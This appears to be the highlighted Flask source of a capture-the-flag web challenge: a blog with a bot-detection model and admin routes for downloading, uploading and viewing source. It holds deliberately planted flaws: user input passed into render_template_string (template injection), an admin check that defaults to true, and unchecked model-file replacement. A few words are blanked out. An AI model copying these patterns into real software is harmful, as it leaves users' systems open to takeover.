&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">safe_join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">template_folder&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">template&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;anonymous&amp;#39;&lt;/span>&lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#75715e"># Someone call me to add a remembered_name function&lt;/span>
&lt;span style="color:#75715e"># But I&amp;#39;m just familiar with PHP !!!&lt;/span>
&lt;span style="color:#75715e"># return render_template_string(&lt;/span>
&lt;span style="color:#75715e"># template.replace(&amp;#39;$remembered_name&amp;#39;, name)&lt;/span>
&lt;span style="color:#75715e"># .replace(&amp;#39;$site_description&amp;#39;, site_description)&lt;/span>
&lt;span style="color:#75715e"># .replace(&amp;#39;$site_title&amp;#39;, site_title), **args)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">template&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;$remembered_name&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">site_description&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">site_description&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">site_title&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">site_title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">post_storage&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">post_storage&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">post_storage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">post_storage&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#111">:]&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">posts&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">post_storage&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/post&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">add_post&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">title&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;title&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[no title]&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[no content]&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;author&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;anonymous&amp;#39;&lt;/span>&lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">check_result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">check_bot&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">check_result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">endswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Human&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;reject because &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> or hacker&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">check_result&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">post_storage&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;title&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;author&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;date&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">datetime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">now&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">strftime&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%B &lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200">, %Y &lt;/span>&lt;span style="color:#d88200">%X&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)})&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Something wrong, contact admin.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin/model_download&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">model_download&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> Download current model.
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;temp.zip&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">z&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;detection.meta&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;detection.index&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;detection.data-00000-of-00001&amp;#39;&lt;/span>&lt;span style="color:#111">]:&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;tf/detection_model/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">arcname&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;temp.zip&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">as_attachment&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">attachment_filename&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;model.zip&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Not a admin **session**. &amp;lt;a href=&amp;#39;/&amp;#39;&amp;gt;Back&amp;lt;/a&amp;gt;&amp;#34;&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">ad&lt;/span> &lt;span style="color:#f92672">in&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">site_description&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">site_title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sess&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin session.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;site_description&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">site_description&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;site_description&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;site_title&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">site_title&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;site_title&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;modelFile&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;modelFile&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print(file, type(file))&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;detection.meta&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;det ction.index&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;detection.data-00000-of-00001&amp;#39;&lt;/span>&lt;span style="color:#111">]:&lt;/span>
&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;tf/detection_model/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;wb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">sess&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">renew&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">tf_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Reloaded succe sfully&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Not a admin **session**. &amp;lt;a href=&amp;#39;/&amp;#39;&amp;gt;Back&amp;lt;/a&amp;gt;&amp;#34;&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin/source&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># &amp;lt;--here â™‚ boy next door&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_source&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;app.py&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin/source_thanos&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_source_broken&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> Thanos is eventually resurrected,[21] and collects the Infinity Gems once again.[22]
&lt;/span>&lt;span style="color:#d88200"> He uses the gems to create the Infinity Gauntlet, making himself omnipotent,
&lt;/span>&lt;span style="color:#d88200"> and erases half the living things in the universe to prove his love to Death.
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;app.py&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">tt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#111">))]&lt;/span>
&lt;span style="color:#111">ll&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">shuffle&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ll&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">ll&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">tt&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">tt&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>
